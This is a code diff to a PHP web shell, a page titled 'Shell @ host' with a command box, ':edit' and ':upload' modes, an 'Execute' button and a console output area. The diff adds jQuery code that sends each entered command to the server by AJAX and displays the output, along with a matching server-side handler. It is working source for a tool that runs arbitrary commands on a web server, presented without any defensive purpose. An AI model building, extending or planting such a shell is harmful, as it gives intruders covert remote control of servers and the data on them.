@@ -1177,12 +1177,48 @@ DATA;
 	 */
 	private function getContent( $sData, $bExdendedInfo = TRUE )
 	{
+		/**
+		 * isAjax
+		 */
+		if( strncasecmp( Request::getServer( 'HTTP_X_REQUESTED_WITH' ), 'XMLHttpRequest', 14 ) === 0 )
+		{
+			preg_match( '~<pre id="console">(.+)</pre>~s', $sData, $aMatch );
+			return $aMatch[1];
+		}
+
+		$sCurrentUrl = Request::getCurrentUrl();
+		$script = <<<DATA
+<script>
+$(function()
+	{
+		$( 'form' ).submit( function()
+			{
+				var sCmd = $( 'input#cmd' ).val();
+
+				if( ( $( 'input#cmd-send[value="Execute"]' ).length > 0 ) && ( sCmd.substring( 0, 5 ) != ':edit' ) && ( sCmd.substring( 0, 7 ) != ':upload' ) )
+				{
+					$( 'pre#console' ).html( '<div id="loading"><marquee behavior="alternate" direction="right" scrollamount="2">LOADING</marquee></div>' );
+
+					$.post( '{$sCurrentUrl}', $( 'form' ).serialize(), function( sData )
+						{
+							$( 'pre#console' ).html( sData );
+						}
+					);
+					return false;
+				}
+			}
+		);
+	}
+);
+</script>
+DATA;
+
 		$sMenu = $this -> getMenu();
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
-<div id=\"body\">\r\n" .
+return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style><script src=\"http://code.jquery.com/jquery-1.6.3.min.js\"></script></head><body>
+<div id=\"body\">\r\n{$script}\r\n" .
 ( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>\r\n" : NULL ) .
 "<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
